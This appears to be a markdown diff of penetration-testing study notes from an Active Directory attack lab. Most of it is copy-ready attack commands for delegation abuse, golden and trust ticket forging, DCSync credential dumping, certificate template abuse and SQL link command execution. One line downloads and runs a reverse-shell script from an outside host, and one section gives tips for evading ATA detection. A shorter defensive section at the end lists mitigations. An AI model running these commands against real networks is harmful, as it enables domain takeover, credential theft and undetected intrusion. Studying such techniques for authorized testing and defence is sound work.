+## Constrained Delegation with Protocol Transition means The web service requests a ticket from the Key Distribution Center (KDC) for someones's account without supplying a password, as the websvc account. The KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that someones's account is not blocked for delegation. To abuse constrained delegation in above scenario, we need to have access to the websvc account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as ANY user.
+
+## Enumerate users and computers with constrained delegation enabled ,Using PowerView (dev)
+`Get-DomainUser–TrustedToAuth`
+`Get-DomainComputer–TrustedToAuth`
+## Using ActiveDirectory module:
+`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
+
+##  Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
+## Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):
+`kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f`
+## Using s4u from Kekeo, we request a TGS  
+`tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyco rp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL`
+## Using mimikatz, inject the ticket:
+`Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
+CAL.kirbi"'`
+`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`
+
+## To abuse Constrained delegation using Rubeus, we can use the following command (We are requesting a TGT and TGS in a single command):
+`Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt`
+`ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$`
+
+## (SUPER IMPORTANT !!) In Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. For example this account samaccountname: (DCORP-ADMINSRV$) can acces this service msds-allowedtodelegateto : (TIME/dcorp-cd.etc) as any user and it can also access all the services that run with the same service account as the TIME service. So all interesting services uses the machine account as the service account (for example TIME SERVICE,winrm, http,rpcss and etc). So that means what we cannot only access the TIME service on the domain controller as an  domain administrator but we can also access the other services.
+
+## Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash  Using asktgt from Kekeo, we request a TGT:
+tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
+## Using s4u from Kekeo_one (no SNAME validation):
+`tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyc orp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL`
+
+## Using mimikatz:
+`Invoke-Mimikatz -Command '"kerberos::ptt GS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'`
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
+
+## To abuse constrained delegation for dcorp-adminsrv$ using Rubeus, we can use the following command (We are requesting a TGT and TGS in a single command)(We asked LDAP service so as to perform dc-sync later :):
+`Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt`
+## After injection, we can run DCSync:
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
+
+
+##  Resource-based Constrained Delegation moves delegation authority to the resource/service administrator. Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity (visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like SQL Server service. That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins. o abuse RBCD in the most effective form, we just need two privileges.
+– One, control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
+– Two, Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity
+
+## Admin privileges on student VMs that are domain joined machines.Enumeration for the users with Write permissions over the machines that have RCBD!
+https://gist.github.com/FatRodzianko/e4cf3efc68a700dca7cedbfd5c05c99f
+## Enumeration would show that the user 'ciadmin' has Write permissions over the dcorp-mgmt machine!
+`Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}`
+
+## Check the MachineAccountQuota setting for the domain and create a computer account using PowerMad:
+#Check MachineAccountQuotaValue
+`Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'`
+#Use PowerMad to leverage MachineAccountQuota and make a new machine that we have control over
+`Import-Module C:ToolsPowermad-masterPowermad.ps1`
+`$password = ConvertTo-SecureString 'ThisIsAPassword' -AsPlainText -Force`
+`New-MachineAccount -machineaccount dcorp-student1 -Password $($password)`
+
+
+## Using the ActiveDirectory module, configure RBCD on dcorp-mgmt for
+student machines :
+`$comps = 'dcorp-student1$','dcorp-student2$'`
+`Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps`
+## Now, let's get the privileges of dcorp-studentx$ by extracting its AESkeys:
+`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
+## Use the AES key of dcorp-studentx$ with Rubeus and access dcorp-
+mgmt as ANY user we want:
+`Rubeus.exe s4u /user:dcorp-student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt`
+`winrs -r:dcorp-mgmt cmd.exe`(Because we have a TGS we cannot jump to another machine as a Domain Admin)
+
+# (Child to Parent)(Forest priv esc)Knock knock whos there? Enterprise admin plz open the gates
+## sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed,they get a new SID and the old SID is added to sIDHistory.sIDHistory can be abused in two ways of escalating privileges within a forest:
+– krbtgt hash of the child
+– Trust tickets
+## So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent.
+`Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc`
+## We can forge and inter-realm TGT:
+`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'`
+
+kerberos::golden The mimikatz module
+/domain:dollarcorp.moneycorp.local FQDN of the current domain
+/sid:S-1-5-21-1874506631-3219952063-538504511 SID of the current domain
+/sids:S-1-5-21-280534878-1496970234-700767426-519 SID of the enterprise admins group of the parent domain
+/rc4:7ef5be456dc8d7450fb8f5f7348746c5 RC4 of the trust key
+/user:Administrator User to impersonate
+/service:krbtgt Target service in the parent domain
+/target:moneycorp.local FQDN of the parent domain
+/ticket:C:\AD\Tools\trust_tkt.kirbi Path where ticket is to be saved
+
+## Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
+`.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local`
+## Use the TGS to access the targeted service.
+`.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi`
+`ls \\mcorp-dc.moneycorp.local\c$`
+## Tickets for other services (like HOST and RPCSS for WMI, HTTP forPowerShell Remoting and WinRM) can be created as well
+## We can use Rubeus too for same results! Note that we are still using the TGT forged initially
+`Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt`
+`ls \\mcorp-dc.moneycorp.local\c$`
+
+## Child to Parent using krbtgt hash.We will abuse sIDhistory once again
+`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
+`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'`
+## In the above command, the mimkatz option "/sids" is forcefully setting the sIDHistory for the Enterprise Admin group for dollarcorp.moneycorp.local that is the Forest Enterprise Admin Group.
+
+## On any machine of the current domain
+`Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'`
+`ls \\mcorp-dc.moneycorp.local.kirbi\c$`
+`gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local`
+`C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"`
+## Child to Parent using krbtgt hash (Reccomended way, really silent and bypasses MDI)Avoid suspicious logs by using Domain Controllers group. • S-1-5-21-2578538781-2508153159-3419410681-516 – Domain Controllers • S-1-5-9 – Enterprise Domain Controllers
+`Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'`
+
+## Across forest trusts will not work as the above as there is SID filtering. You can only access resources that are explicitly allowed, between forests and you do it the same way as above. In this case the shares
+`Once again, we require the trust key for the inter-forest trust.
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
+## An inter-forest TGT can be forged
+`Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'`
+##  Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
+`.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbiCIFS/eurocorp-dc.eurocorp.local`
+## Use the TGS to access the targeted service.
+`.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
+`ls \\eurocorp-dc.eurocorp.local\forestshare\`
+## Using Rubeus (using the same TGT which we forged earlier):
+`Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi/service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt`
+`ls \\eurocorp-dc.eurocorp.local\forestshare\`
+
+
+# AD CS Certificates
+## Enumerate (and for other attacks) AD CS in the target forest:
+`Certify.exe cas`
+## Enumerate the templates.:
+`Certify.exe find`
+## Enumerate vulnerable templates(This only checks if domain users have enrolemnt rights on any template) The attack surface is huge so dont trust this:  
+`Certify.exe find /vulnerable`
+
+## The template "SmartCardEnrollment-Agent" allows Domain users to enroll and has "Certificate Request Agent" EKU.
+`Certify.exe find /vulnerable`
+## The template "SmartCardEnrollment-Users" has an Application Policy Issuance Requirement of Certificate Request Agent and has an EKU that allows for domain authentication. Search for domain authentication EKU:
+`Certify.exe find /json /outfile:C:\AD\Tools\file.json ((Get-Content C:\AD\Tools\file.json | ConvertFrom-Json).CertificateTemplates | ? {$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *`
+
+## Escalation to DA, We can now request a certificate for Certificate Request Agent from "SmartCardEnrollment-Agent" template.
+`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA/template:SmartCardEnrollment-Agent`
+## Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.
+`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`
+## Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:
+`Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt`
+
+## scalation to EA, Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the "SmartCardEnrollment-Users" template.
+`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123`
+## Request EA TGT and inject it:
+`Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt`
+
+## The CA in moneycorp has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This means that we can request a certificate for ANY user from a template that allow enrollment for normal/low-privileged users.
+`Certify.exe find`
+## The template "CA-Integration" grants enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
+`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator`
+## Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (orEA).
+`Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt`
+
+## The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag.(So we can access put the subject we want, so we can acces cert on behalf of whoever we want)
+`Certify.exe find /enrolleeSuppliesSubject`
+## The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
+`Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator`
+## Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).
+`Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt`	
+
+
+# Trust Abuse - MSSQL Servers - Databases links have no forest boundaries and etc ( same as love (credits to Nikhil Mittal) 
+
+## Discovery (SPN Scanning)
+`Get-SQLInstanceDomain`(returns all, maybe not active)
+## Check Accessibility
+`Get-SQLConnectionTestThreaded`
+`Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`(returns the active ones)
+## Gather Information
+`Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`(returns the active ones)
+## A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.
+## Searching Database Links, Look for links to remote servers
+`Get-SQLServerLink -Instance dcorp-mssql -Verbose`
+## Crawl all the Database Links and find the way to success
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
+## Executing Commands on all machines in the chain in order to see if any of them will give us a result back so we will have cmnd exec. When u find one machine,Use the -QuertyTarget parameter to run Query on a specific instance.(Have in mind that if you have admin privs one a database, you can do several things there, instead of just getting a rev shell and run whoam /all (get caught) and find priv esc)
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"`
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`
+`Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'`
+
+# What we learned so far
+## Reduce the number of Domain Admins in your environment.
+## Do not allow or limit login of DAs to any other machine other than the Domain Controllers. If logins to some servers is necessary, do not allow other administrators to login to that machine.
+## (Try to) Never run a service with a DA. Credential theft protections(Credential Guard,Protected users group) are not protecting against extracting credential from the registry, only from lsass.
+• Set "Account is sensitive and cannot be delegated" for DAs.
+
+## Protected Users Group
+• Protected Users is a group introduced in Server 2012 R2 for "better protection
+against credential theft" by not caching credentials in insecure ways. A user added
+to this group has following major device protections:
+– Cannot use CredSSP and WDigest - No more cleartext credentials caching.
+– NTLM hash is not cached.
+– Kerberos does not use DES or RC4 keys. No caching of clear text cred or long term keys. You can still kerberoast a member of a protected user group because RC4 is controlled by the client because when u request a TGS you can force downgrade to RC4 and the KDC will comply !
+• If the domain functional level is Server 2012 R2, following DC protections are
+available:
+– No NTLM authentication.
+– No DES or RC4 keys in Kerberos pre-auth.
+– No delegation (constrained or unconstrained)
+– No renewal of TGT beyond initial four hour lifetime - Hardcoded, unconfigurable "Maximum
+Protected Users Group
+• Needs all domain control to be at least Server 2008 or later (because
+AES keys).
+• Not recommended by MS to add DAs and EAs to this group without
+testing "the potential impact" of lock out.
+• No cached logon ie.e no offline sign-on.
+• Having computer and service accounts in this group is useless as their
+credentials will always be present on the host machine.
+Privileged Administrative Workstations (PAWs)
+• A hardened workstation for performing sensitive tasks like
+administration of domain controllers, cloud infrastructure, sensitive
+business functions etc.
+• Can provides protection from phishing attacks, OS vulnerabilities,
+credential replay attacks.
+• Admin Jump servers to be accessed only from a PAW, multiple strategies
+– Separate privilege and hardware for administrative and normal tasks.
+– Having a VM on a PAW for user tasks.
+LAPS (Local Administrator Password Solution)
+• Centralized storage of passwords in AD with periodic randomizing where
+read permissions are access controlled.
+• Computer objects have two new attributes - ms-mcs-AdmPwd attribute
+stores the clear text password and ms-mcs-AdmPwdExpirationTime
+controls the password change. (Only DA can read the password from a machine acc, even the machine account cannot read(but can write) it but With careful enumeration, it is possible to retrieve which users can access(read) the clear text password providing a list of attractive targets!
+• Storage in clear text, transmission is encrypted.
+## Just In Time (JIT) administration provides the ability to grant time-bound
+administrative access on per-request bases.
+• Check out Temporary Group Membership! (Requires Privileged Access
+Management Feature to be enabled on the forest level which can't be turned off later)
+`Add-ADGroupMember -Identity 'Domain Admins' -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 60)`
+JEA (Just Enough Administration) provides role based access control for PowerShell based remote delegated administration.
+• With JEA non-admin users can connect remotely to machines for doing
+specific administrative tasks.
+• For example, we can control the command a user can run and even
+restrict parameters which can be used.
+• JEA endpoints have PowerShell transcription and logging enabled.
+## Credential Guard(bypassed my mimikatz)
+It "uses virtualization-based security to isolate secrets so that only
+privileges system software can access them".
+• Effective in stopping PTH and Over-PTH attacks by restricting access to
+NTLM hashes and TGTs. It is not possible to write Kerberos tickets to
+memory even if we have credentials.  But,
+https://docs.microsoft.com/en-us/windows/access-protection/credential-guard/credential-guard
+
+## Device Guard (WDAC)
+ UMCI is something which interferes with most of the lateral movement attacks we
+have seen.
+• While it depends on the deployment (discussing which will be too lengthy), many
+well known application whitelisting bypasses - signed binaries like csc.exe,
+MSBuild.exe etc. - are useful for bypassing UMCI as well.
+• Check out the LOLBAS project (lolbas-project.github.io/).
+
+# Bypassing ATA:(DONT DOWNGRADE USE AES, COMPLY WITH THE TIME POLICIES, DONT CREATE TICKETS WITH 9999 TIME YOU FOOL)
+## ATA, for all its goodness, can be bypassed and avoided.
+## The key is to avoid talking to the DC as long as possible and make appear the traffic we generate as attacker normal.
+## To bypass DCSync detection, go for users which are whitelisted. Usually, accounts like Sharepoint Administrators and Azure AD Connect PHS account may be whitelisted. 
+## If you use invoke-kerberos or rubeus to quickly request TGS for all the SPN's you will get detected
+## Also, if we have NTLM hash of a DC, we can extract NTLM hashes of any machine account using netsync
+## If we forge a Golden Ticket with SID History of the Domain Controllers group and Enterprise Domain Controllers Group, there are less chances of detection by ATA:
+`Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`
